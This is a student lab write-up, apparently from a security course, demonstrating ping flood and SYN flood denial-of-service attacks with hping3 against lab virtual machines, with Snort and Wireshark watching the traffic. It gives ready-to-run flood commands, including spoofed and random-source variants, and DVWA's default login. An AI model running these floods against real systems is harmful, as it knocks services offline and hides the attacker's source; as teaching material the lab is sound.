Experiment 7 — DoS Attack using Hping3
(Ping Flood & SYN Flood)
Aim
To perform Ping Flood and SYN Flood Denial of Service (DoS) attacks using Hping3 tool.
Theory
Denial of Service (DoS) Attack
A Denial of Service attack is a cyber attack in which an attacker attempts to make a machine or
network resource unavailable to legitimate users by flooding the target with excessive traffic.
Ping Flood Attack
Ping Flood attack sends a large number of ICMP Echo Request packets to the target system,
consuming network bandwidth and system resources.
SYN Flood Attack
SYN Flood attack exploits the TCP three-way handshake by sending numerous SYN packets
without completing the connection, causing the server to become overloaded.
Hping3
Hping3 is a packet crafting and network testing tool used for generating TCP, UDP, and ICMP
packets. It is commonly used for firewall testing, network analysis, and DoS attacks.
Requirements
• Kali Linux VM
• Ubuntu VM
• Metasploitable2 VM
• Wireshark
• Snort IDS
• Hping3 Tool
Procedure
Part A — Ping Flood Attack
Step 1: Start Virtual Machines
• Start Kali Linux VM
• Start Ubuntu VM
Step 2: Test Connectivity
In Kali terminal:
ping 192.168.245.134
Observation:
• ICMP request and reply packets are observed.
Step 3: Start Wireshark
• Open Wireshark in Ubuntu VM.
• Start packet capture.
Observation:
• ICMP Echo Request and Echo Reply packets are captured.
Step 4: Install Snort
In Ubuntu terminal:
sudo apt-get install snort -y
Step 5: Start Snort IDS
Command:
sudo snort -A console -c /etc/snort/snort.conf
Observation:
• Snort starts monitoring packets.
Step 6: Perform Ping Flood Attacks
a) Send Single ICMP Packet
sudo hping3 -1 -c 1 192.168.245.134
b) ICMP Packet with Delay
sudo hping3 -1 -c 1 -i 5 192.168.245.134
c) Faster Flood Attack
sudo hping3 -1 --faster 192.168.245.134
d) Continuous Flood Attack
sudo hping3 -1 --faster 192.168.245.134
e) Spoofed Source Address
sudo hping3 -1 -a 192.168.245.128 192.168.245.134
f) Random Source Flood
sudo hping3 -1 --rand-source 192.168.245.134
Observation:
• Large number of ICMP packets observed in Wireshark.
• Snort detects abnormal traffic.
• Network traffic increases heavily.
Part B — SYN Flood Attack
Step 7: Start Machines
• Start Kali Linux VM
• Start Metasploitable2 VM
Step 8: Open DVWA
In browser:
http://192.168.245.133/dvwa
Login:
Username: admin
Password: password
Step 9: Perform SYN Flood Commands
a) Send Single SYN Packet
sudo hping3 -S -c 1 -p 80 192.168.245.133
b) SYN Packet with Delay
sudo hping3 -S -c 1 -p 80 -i 5 192.168.245.133
c) SYN Flood Attack
sudo hping3 -S --flood -p 80 192.168.245.133
Observation:
• Huge number of SYN packets captured in Wireshark.
• DVWA webpage becomes slow or unresponsive.
Observation
• ICMP flood increases network traffic significantly.
• SYN flood overloads target server resources.
• Wireshark captures packet flooding activity.
• Snort IDS detects suspicious packets.
Result
Successfully performed:
• Ping Flood DoS Attack
• SYN Flood DoS Attack
using Hping3 tool.
